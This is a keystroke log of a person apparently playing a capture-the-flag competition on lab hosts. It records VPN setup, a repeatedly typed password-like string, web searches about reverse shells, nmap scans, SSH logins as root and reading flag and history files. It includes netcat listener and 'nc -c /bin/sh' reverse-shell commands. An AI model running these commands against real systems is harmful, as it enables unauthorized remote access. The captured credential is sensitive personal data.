2023-02-23 15:52:22-0500	<LShft>EZl<LShft>Yjlw<LShft>Mj<LShft>M=<Left><Left><Left><Left><Left><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>cybermayhem<LShft>_blueridge01<LShft>_12183.ovpn<BckSp><BckSp><BckSp><BckSp><BckSp>	cybermayhem_blueridge01_12183	cybermayhem_blueridge01_1218	0.38666666666666666		
2023-02-23 15:59:20-0500	<Enter>hackthe<BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>thefirstruleofcst	thefirstruleofcst	thefirstruleofcs	0.3617021276595745		
2023-02-23 15:59:38-0500	<Enter><Up>			0.0		
2023-02-23 15:59:45-0500	<Enter>thefirstruleofcst	thefirstruleofcst	thefirstruleofcs	1.0		
2023-02-23 15:59:56-0500	<Enter>clear<BckSp><BckSp><BckSp><BckSp><BckSp><Up><Up><Down><Up>			0.0		
2023-02-23 16:01:06-0500	<Enter><Up>			0.0		
2023-02-23 16:02:47-0500	<Enter><Up><BckSp><BckSp><#+25><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><LCtrl>s	s		0.05263157894736842		
2023-02-23 16:03:26-0500	<Enter><Up><BckSp><LCtrl>ssudo p<BckSp>openvpn cybermay<BckSp><BckSp><BckSp><Tab>	ssudo openvpn cyber	ssudo	0.6129032258064516		
2023-02-23 16:03:57-0500	<Enter>thefirstruleofsc<BckSp><BckSp>cst	thefirstruleofcst	thefirstruleofcs	0.8095238095238095		
2023-02-23 16:04:03-0500	<Enter><LCtrl><LShft>++++<LCtrl><LShft>_-<BckSp><LCtrl>-<LMeta><Left><LMeta><Right><LCtrl><LShft><#+22><#+22><LCtrl>-<LCtrl>-<LMeta><Right>netcat <BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>nc <LCtrl><LShft>V	++++_-<#+22><#+22>-nc V	++++_-<#+22><#+22>-nc	0.39655172413793105		
2023-02-23 16:07:39-0500	<Enter>nc<BckSp><BckSp><BckSp>ls nc	ls nc	ls	0.5		
2023-02-23 16:07:49-0500	<Enter>ls netcat	ls netcat	ls	1.0		
2023-02-23 16:07:52-0500	<Enter>man nc	man nc	man	1.0		
2023-02-23 16:07:57-0500	<Enter><Down><#+20><Down><#+18><Down><#+20><Down><#+19><Down><#+23><Down><#+21>how to get on a server	<#+20><#+18><#+20><#+19><#+23><#+21>how to get on a server	<#+20><#+18><#+20><#+19><#+23><#+21>how	0.90625		
2023-02-23 16:08:35-0500	<Enter><BckSp><BckSp><#+7>erver	<#+7>erver	<#+7>erve	0.8333333333333334		
2023-02-23 16:08:54-0500	<Enter> through the terminal	 through the terminal		1.0		
2023-02-23 16:09:01-0500	<Enter>qqssh <LCtrl><LShft><LCtrl><LShft>V	qqssh V	qqssh	0.6363636363636364		
2023-02-23 16:09:10-0500	<Enter>ls<BckSp><BckSp>y	y		0.2		
2023-02-23 16:09:15-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:09:16-0500	<Enter>ls<BckSp><BckSp>123	123	12	0.42857142857142855		
2023-02-23 16:09:22-0500	<Enter>lkj<BckSp><BckSp> host	l host	l	0.6		
2023-02-23 16:10:21-0500	<Enter><LCtrl>zssh local ho<BckSp><BckSp><BckSp>host	zssh localhost	zssh	0.6666666666666666		
2023-02-23 16:10:32-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:10:35-0500	<Enter>how the box battlegrounds how to	how the box battlegrounds how to	how	1.0		
2023-02-23 16:10:52-0500	<Enter><LCtrl>c	c		0.5		
2023-02-23 16:12:03-0500	c<LCtrl>zclear	czclear	czclea	1.0		
2023-02-23 16:12:10-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:12:12-0500	<Enter>how to install a rever<BckSp>se<BckSp><BckSp>rse shell on <BckSp>to a ip address	how to install a reverse shell onto a ip address	how	0.8571428571428571		
2023-02-23 16:13:18-0500	<Enter>nc -lvp 9001	nc -lvp 9001	nc	1.0		
2023-02-23 16:14:05-0500	<Enter><LCtrl>znc -lvp <LCtrl><LShft>V	znc -lvp V	znc	0.7692307692307693		
2023-02-23 16:14:12-0500	<Enter>nc<BckSp><BckSp>what does nc -lvp do	what does nc -lvp do	what	0.8333333333333334		
2023-02-23 16:14:27-0500	<Enter><Up><Up> -p what port is is tcp on	 -p what port is is tcp on		0.9285714285714286		
2023-02-23 16:14:55-0500	<Enter>what port	what port	what	1.0		
2023-02-23 16:15:04-0500	<Enter>22	22	2	1.0		
2023-02-23 16:15:19-0500	<Enter><Up><Up><Down><BckSp><BckSp>80	80	8	0.2857142857142857		
2023-02-23 16:15:28-0500	<Enter>ping <LCtrl><LShft>V	ping V	ping	0.75		
2023-02-23 16:16:07-0500	<Enter><LCtrl>zhow to put a reverse shell on a server	zhow to put a reverse shell on a server	zhow	0.975		
2023-02-23 16:16:31-0500	<Enter>nmap -<LShft>Pn <LCtrl><LShft>V	nmap -Pn V	nmap	0.7692307692307693		
2023-02-23 16:16:48-0500	<Enter>nc -<BckSp><LCtrl><LShft>V -p 22	nc V -p 22	nc	0.7142857142857143		
2023-02-23 16:19:08-0500	<Enter>how do esnc work	how do esnc work	how	1.0		
2023-02-23 16:19:21-0500	<Enter><BckSp><BckSp><BckSp>n	n		0.25		
2023-02-23 16:19:26-0500	<Enter>command	command	comman	1.0		
2023-02-23 16:19:37-0500	<Enter>how to send a file to <BckSp><BckSp><BckSp>using nc to a <BckSp>n open o<BckSp>port	how to send a file using nc to an open port	how	0.8113207547169812		
2023-02-23 16:20:02-0500	<Enter>how to open a reveser shell on someon's ssh port	how to open a reveser shell on someon's ssh port	how	1.0		
2023-02-23 16:20:59-0500	<Enter>is port 22 an unfiltered port	is port 22 an unfiltered port	is	1.0		
2023-02-23 16:22:16-0500	<Enter><BckSp><BckSp>3000	3000	300	0.6666666666666666		
2023-02-23 16:22:41-0500	<Enter><LCtrl>v<LCtrl><LShft>V<BckSp><#+19>nc -l -l<BckSp>p <LShft><<LCtrl><LShft>V<LShft>><BckSp><#+13><BckSp><BckSp><BckSp>3000<LShft>> -vvv	v<#+19>nc -l -p <V<#+3000> -vvv	v<#+19>nc	0.6078431372549019		
2023-02-23 16:23:24-0500	<Enter><Up><Left><#+8><Left><Left><BckSp><BckSp><BckSp><BckSp>22	22<	22	0.2		
2023-02-23 16:23:31-0500	<Enter>nc -c /bin/bh <BckSp><BckSp><BckSp>sh <LShft><<BckSp><#+19>whoami	nc -c /bin/sh <#+19>whoami	nc	0.7428571428571429		
2023-02-23 16:24:01-0500	<Enter>how to look up your ip address	how to look up your ip address	how	1.0		
2023-02-23 16:24:10-0500	<Enter> thought the terminal	 thought the terminal		1.0		
2023-02-23 16:24:18-0500	<Enter>netstat -r	netstat -r	netstat	1.0		
2023-02-23 16:24:32-0500	<Enter><LCtrl><LShft>c	c		0.3333333333333333		
2023-02-23 16:24:49-0500	Csss<BckSp>h <LCtrl><LShft>V	Cssh V	Cssh	0.6666666666666666		
2023-02-23 16:25:09-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:25:14-0500	<Enter><LCtrl>znmap <LCtrl><LShft>V	znmap V	znmap	0.7		
2023-02-23 16:25:27-0500	<Enter>how to close a port on a server	how to close a port on a server	how	1.0		
2023-02-23 16:25:46-0500	<Enter>sudo lsof -i <LShft>:9001	sudo lsof -i :9001	sudo	0.9473684210526315		
2023-02-23 16:26:02-0500	<Enter>thefirstruleofs<BckSp>cst	thefirstruleofcst	thefirstruleofcs	0.8947368421052632		
2023-02-23 16:26:09-0500	<Enter><Up>			0.0		
2023-02-23 16:26:21-0500	<Enter>nmap <LCtrl><LShft>V	nmap V	nmap	0.75		
2023-02-23 16:26:59-0500	<Enter>killkill 4759	killkill 4759	killkill	1.0		
2023-02-23 16:27:20-0500	<Enter>nc localhosr<BckSp>t 9001	nc localhost 9001	nc	0.8947368421052632		
2023-02-23 16:27:32-0500	<Enter><LCtrl>znmap <LCtrl><LShft>V	znmap V	znmap	0.7		
2023-02-23 16:27:48-0500	<Enter><Up><Up><Up><Up>			0.0		
2023-02-23 16:27:59-0500	<Enter>kill <BckSp><#+11><BckSp><Up><BckSp><BckSp><BckSp><BckSp><BckSp><#+19>clear	kill<#+19>clear	kill<#+19>clea	0.5		
2023-02-23 16:28:45-0500	<Enter>nmap <LCtrl><LShft>V	nmap V	nmap	0.75		
2023-02-23 16:28:50-0500	<Enter>sudo -lsf<Up><Up><Up><BckSp><BckSp><BckSp><BckSp>8080	sudo 8080	sudo	0.45		
2023-02-23 16:29:10-0500	<Enter>kill<BckSp><BckSp><BckSp><BckSp><Up><Up><Up><Up><Up><Down><Up><Up><Down><Down><Down><BckSp><BckSp><BckSp><BckSp><BckSp><Up><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>445	445	44	0.08571428571428572		
2023-02-23 16:30:23-0500	<Enter>kil<BckSp><BckSp><BckSp>nmap <LCtrl><LShft>V	nmap V	nmap	0.42857142857142855		
2023-02-23 16:30:46-0500	<Enter>ssh 10.10.111.106	ssh 10.10.111.106	ssh	1.0		
2023-02-23 16:32:45-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:32:47-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:32:49-0500	<Enter><LCtrl>zclear	zclear	zclea	0.8571428571428571		
2023-02-23 16:33:02-0500	<Enter>ssh 20<BckSp><BckSp>10.10.111.105	ssh 10.10.111.105	ssh	0.8095238095238095		
2023-02-23 16:33:11-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:33:13-0500	<Enter><LCtrl><LShft>V<LCtrl><LShft>V	VV	V	0.3333333333333333		
2023-02-23 16:33:27-0500	<Enter><Up><Up><Up><Down><LCtrl><LShft>V	V		0.14285714285714285		
2023-02-23 16:33:40-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:33:45-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:33:50-0500	<Enter><Up>			0.0		
2023-02-23 16:34:26-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:34:29-0500	<Enter><LCtrl>zclear	zclear	zclea	0.8571428571428571		
2023-02-23 16:34:47-0500	<Enter>ssh 10.10.111.107	ssh 10.10.111.107	ssh	1.0		
2023-02-23 16:34:53-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:34:55-0500	<Enter><LCtrl>zhow to get to the root path when you have an ip address and root password of a server	zhow to get to the root path when you have an ip address and root password of a server	zhow	0.9885057471264368		
2023-02-23 16:35:35-0500	<Enter>ssh rootparth<BckSp><BckSp><BckSp>th 10.10.11.10<BckSp><BckSp><BckSp>1.107	ssh rootpath 10.10.111.107	ssh	0.6842105263157895		
2023-02-23 16:35:54-0500	<Enter>ssh 10.10.111.106 rootpath	ssh 10.10.111.106 rootpath	ssh	1.0		
2023-02-23 16:36:30-0500	<Enter>ssh root<LCtrl>zced<BckSp><BckSp><BckSp>ssh root<LShft>@10.10.11.1<BckSp><BckSp>1.106	ssh rootzssh root@10.10.111.106	ssh	0.7209302325581395		
2023-02-23 16:36:55-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:37:25-0500	<Enter>sudo apt update	sudo apt update	sudo	1.0		
2023-02-23 16:37:41-0500	<Enter><LCtrl>zhow to see what packages can be updated	zhow to see what packages can be updated	zhow	0.975609756097561		
2023-02-23 16:38:26-0500	<Enter>apt list --upgradable	apt list --upgradable	apt	1.0		
2023-02-23 16:38:40-0500	<Enter>-a	-a	-	1.0		
2023-02-23 16:38:45-0500	<Enter>apt list --upgradable -a	apt list --upgradable -a	apt	1.0		
2023-02-23 16:38:51-0500	<Enter>sudo apt update	sudo apt update	sudo	1.0		
2023-02-23 16:39:10-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:39:32-0500	<Enter>cd<BckSp><BckSp>cat flag.txt	cat flag.txt	cat	0.75		
2023-02-23 16:39:39-0500	<Enter>lsa<BckSp> -a	ls -a	ls	0.7142857142857143		
2023-02-23 16:39:57-0500	<Enter>cd .bash<Tab><LShft>_<Tab>his<Tab>tory<LShft><#+7><BckSp><#+14><BckSp> <LShft>".bash<Tab>.<BckSp><LShft>_history<LShft>"	cd .bash_history<#+7<#+14 ".bash_history"	cd	0.7321428571428571		
2023-02-23 16:40:36-0500	<Enter>cat <LShft>".bash<LShft>_history<LShft>"	cat ".bash_history"	cat	0.8636363636363636		
2023-02-23 16:40:47-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:40:53-0500	<Enter>cat etc	cat etc	cat	1.0		
2023-02-23 16:40:59-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:41:02-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:41:09-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:41:13-0500	<Enter>cd <LShft>~<LShft>#	cd ~#	cd	0.7142857142857143		
2023-02-23 16:41:23-0500	<Enter>cd .<BckSp><BckSp><BckSp><BckSp><BckSp>cd<BckSp><BckSp>ls	ls	l	0.13333333333333333		
2023-02-23 16:41:38-0500	<Enter>cd bin	cd bin	cd	1.0		
2023-02-23 16:41:46-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:41:47-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:41:53-0500	<Enter>ls	ls	l	1.0		
